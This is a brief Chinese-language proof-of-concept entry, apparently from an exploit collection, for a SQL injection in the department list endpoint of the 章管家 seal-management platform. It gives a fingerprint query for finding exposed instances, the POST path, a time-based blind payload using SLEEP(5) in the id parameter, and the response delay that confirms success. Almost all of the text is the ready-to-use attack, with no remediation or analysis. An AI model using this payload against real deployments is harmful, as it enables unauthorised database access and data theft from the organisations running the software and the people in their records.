# 章管家list接口存在SQL注入漏洞

章管家list接口 ｜ SQL注入 ｜ —
- **指纹**：`app="章管家-印章智慧管理平台"`
- **请求**：`POST /app/department/list.htm HTTP/1.1`

**Payload**
```
token=dingtalk_token&person_id=1&unit_id=1&id=' or SLEEP(5) or '
```
- **响应特征**：200 响应时间>=5s